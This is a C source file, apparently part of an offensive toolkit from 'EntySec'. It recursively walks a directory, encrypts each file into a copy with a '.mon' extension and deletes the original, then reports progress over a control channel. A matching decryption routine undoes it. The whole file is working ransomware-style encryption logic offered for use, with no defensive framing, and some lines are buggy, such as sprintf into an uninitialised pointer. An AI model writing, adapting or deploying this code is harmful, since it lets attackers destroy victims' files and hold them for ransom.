/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

#include "evp.h"
#include "tools.h"
#include "channel.h"

char *ext = ".mon";

int begin_encrypt(int channel, char *path, char *key, char *iv)
{
    struct dirent *dir;
    DIR *dr = opendir(path);

    if (dr == NULL)
        return 0;

    char *newName, *toVisit;
    FILE *old, *newone;

    while ((dir = readdir(dr)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ext) == NULL) {
            toVisit = linkStr(path, dir->d_name, 1);
            if (begin_encrypt(channel, toVisit, key, iv) == 0) {
                newName = linkStr(toVisit, ext, 0);
                old = fopen(toVisit, "rb");
                newone = fopen(newName, "wb");

                encrypt(old, newone, key, iv);
                deleteFile(toVisit);

                fclose(old);
                fclose(newone);

                free(newName);
            } else {
                char *process;
                sprintf(process, "Encrypting %s\n", dir->d_name);
                send_channel(channel, process);
            }
            free(toVisit);
        }
    }
    closedir(dr);
    return 1;
}

int begin_decrypt(int channel, char *path, char *key, char *iv)
{
    struct dirent *dir;
    DIR *dr = opendir(path);

    if (dr == NULL)
        return 0;

    char *newName, *toVisit;
    FILE *old, *newone;

    while ((dir = readdir(dr)) != NULL) {
        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
            toVisit = linkStr(path, dir->d_name, 1);
            if (begin_decrypt(channel, toVisit, key, iv) == 0) {
                newName = removeLastChars(toVisit, strlen(ext));
                old = fopen(toVisit, "rb");
                newone = fopen(newName, "wb");

                decrypt(old, newone, key, iv);
                deleteFile(toVisit);

                fclose(old);
                fclose(newone);

                free(newName);
            } else {
                char *process;
                sprintf(process, "Decrypting %s\n", dir->d_name);
                send_channel(channel, process);
            }
            free(toVisit);
        }
    }
    closedir(dr);
    return 1;
}
